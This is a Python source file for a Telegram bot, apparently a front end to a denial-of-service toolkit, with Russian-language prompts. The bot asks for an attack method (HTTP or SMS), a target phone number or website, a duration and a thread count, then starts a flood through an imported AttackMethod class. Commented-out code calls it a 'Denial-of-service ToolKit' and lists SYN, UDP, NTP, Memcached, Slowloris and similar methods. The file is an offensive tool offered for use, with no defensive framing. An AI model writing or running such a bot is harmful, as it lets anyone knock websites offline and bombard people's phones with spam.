import os
import sys
import argparse

from aiogram import types
from aiogram.dispatcher import FSMContext
from aiogram.utils import executor

from loader import dp, bot
from states import SpamState
from tools.crash import CriticalError
import tools.addons.clean
import tools.addons.logo
import tools.addons.winpcap
from tools.method import AttackMethod

os.chdir(os.path.dirname(os.path.realpath(__file__)))

# try:
#     from tools.crash import CriticalError
#     import tools.addons.clean
#     import tools.addons.logo
#     import tools.addons.winpcap
#     from tools.method import AttackMethod
# except ImportError as err:
#     CriticalError("Failed import some modules", err)
#     sys.exit(1)

# Parse args
# parser = argparse.ArgumentParser(description="Denial-of-service ToolKit")
# parser.add_argument(
#     "--target",
#     type=str,
#     metavar="<IP:PORT, URL, PHONE>",
#     help="Target ip:port, url or phone",
# )
# parser.add_argument(
#     "--method",
#     type=str,
#     metavar="<SMS/EMAIL/NTP/UDP/SYN/ICMP/POD/SLOWLORIS/MEMCACHED/HTTP>",
#     help="Attack method",
# )
# parser.add_argument(
#     "--time", type=int, default=10, metavar="<time>", help="time in secounds"
# )
# parser.add_argument(
#     "--threads", type=int, default=3, metavar="<threads>", help="threads count (1-200)"
# )
#
# method = ''
# threads = ''
# time = ''
# target = ''


@dp.message_handler(commands='start')
async def cmd_start(message: types.Message):
    """Приветственное сообщение"""
    await message.answer("Привет! Я спам-бот")


@dp.message_handler(lambda message: message.text == 'спам'.lower())
async def get_method(message: types.Message):
    await message.answer('Введите метод (HTTP, SMS)')
    await SpamState.method.set()


@dp.message_handler(state=SpamState.method)
async def add_method(message: types.Message, state: FSMContext):
    global method
    method = message.text.upper()
    await state.update_data(answer1=method)
    await message.answer('Введите номер телефона или адрес сайта')
    await SpamState.target.set()


@dp.message_handler(state=SpamState.target)
async def add_time(message: types.Message, state: FSMContext):
    global target
    target = message.text
    await state.update_data(answer1=target)
    await message.answer('Введите время спама')
    await SpamState.time.set()


@dp.message_handler(state=SpamState.time)
async def add_threads(message: types.Message, state: FSMContext):
    global time
    time = message.text
    await state.update_data(answer1=time)
    await message.answer('Введите количество потоков (1 - 200)')
    await SpamState.threads.set()


@dp.message_handler(state=SpamState.threads)
async def add_threads(message: types.Message, state: FSMContext):
    global threads
    threads = message.text
    await state.update_data(answer1=threads)
    await message.answer('Закончили заполнение, идет подготовка!')
    await message.answer(f'Метод: {method};\n'
                         f'Цель: {target};\n'
                         f'Кол-во потоков: {threads}\n'
                         f'Время спама: {time}')

    with AttackMethod(
        duration=int(time), name=method, threads=int(threads), target=target
    ) as Flood:
        Flood.Start()
    await state.finish()


if __name__ == "__main__":
    # Run ddos attack


    executor.start_polling(dp, skip_updates=True)
